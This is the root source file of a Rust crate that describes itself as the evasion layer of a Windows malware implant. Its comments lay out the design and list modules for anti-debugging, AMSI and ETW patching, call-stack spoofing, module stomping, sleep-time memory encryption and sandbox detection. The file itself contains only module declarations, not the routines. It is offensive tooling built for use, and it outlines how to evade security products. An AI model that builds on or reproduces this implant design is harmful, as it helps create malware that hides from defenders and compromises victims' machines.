//! nyx-implant-evasion — evasion layer of the Windows PIC implant.
//!
//! Extracted from `nyx-implant-win` (WP-C crate split): the second layer of
//! the implant DAG (`core ← evasion ← net ← tasks ← shell`). Everything here
//! builds on [`nyx_implant_core`] (PEB walk, indirect syscalls, NT heap) and
//! is consumed upward by the shell crate (and later by the net/tasks crates);
//! nothing here may depend on those higher layers.
//!
//! This crate is `#![no_std]` like the shell and core; the globally-unique
//! items (`#[global_allocator]`, `#[panic_handler]`, …) stay in the shell
//! cdylib (`nyx-implant-win`).
//!
//! ## Modules
//! - [`antidebug`] — BeingDebugged / ProcessDebugPort / uptime checks.
//! - [`blind`] — AMSI/ETW userland byte-patch (idempotent; AMSI retried/cycle).
//! - [`blind_hwbp`] — hardware-breakpoint (DR0-7) ETW/AMSI blinding via VEH.
//! - [`cfg_user`] — user-mode CFG bitmap extension for implant code pages.
//! - [`proxy_veh`] — VEH proxy gadgets (`jmp rbx`) for indirect-call chains.
//! - [`caller_spoof`] — CET/IBC status probe for call-stack spoofing.
//! - [`hookchain`] — IAT hook-chain redirect onto indirect-syscall stubs.
//! - [`lacuna`] / [`lacuna_stomp`] — ghost-region scan + module stomping.
//! - [`sleep`] / [`fluctuation`] / [`fluctuation_thunk`] — sleep-mask family
//!   (Foliage APC / .text page-flip / PIC thunk).
//! - [`mem`] — sleep-time memory encryption (RC4 over registered regions).
//! - [`insomniac`] — .text tamper watchdog (detects AV/EDR byte patches).
//! - [`envprobe`] — VM/sandbox environment probe suite.
//! - [`evasion_glue`] — live impls of the `nyx-implant-evasionsdk` trait
//!   seams over the running process.

#![cfg_attr(not(test), no_std)]

extern crate alloc;

#[cfg(target_os = "windows")]
pub mod antidebug;
#[cfg(target_os = "windows")]
pub mod blind;
#[cfg(target_os = "windows")]
pub mod blind_hwbp;
#[cfg(target_os = "windows")]
pub mod caller_spoof;
// cfg_user / fluctuation / fluctuation_thunk are declared WITHOUT an outer
// cfg gate (they carry a file-level `#![cfg(target_os = "windows")]` that
// empties them off-target) — this mirrors their declaration in the shell
// crate before the split.
pub mod cfg_user;
#[cfg(target_os = "windows")]
pub mod envprobe;
#[cfg(target_os = "windows")]
pub mod evasion_glue;
pub mod fluctuation;
pub mod fluctuation_thunk;
#[cfg(target_os = "windows")]
pub mod hookchain;
#[cfg(target_os = "windows")]
pub mod insomniac;
#[cfg(target_os = "windows")]
pub mod lacuna;
#[cfg(target_os = "windows")]
pub mod lacuna_stomp;
#[cfg(target_os = "windows")]
pub mod mem;
#[cfg(target_os = "windows")]
pub mod proxy_veh;
#[cfg(target_os = "windows")]
pub mod sleep;
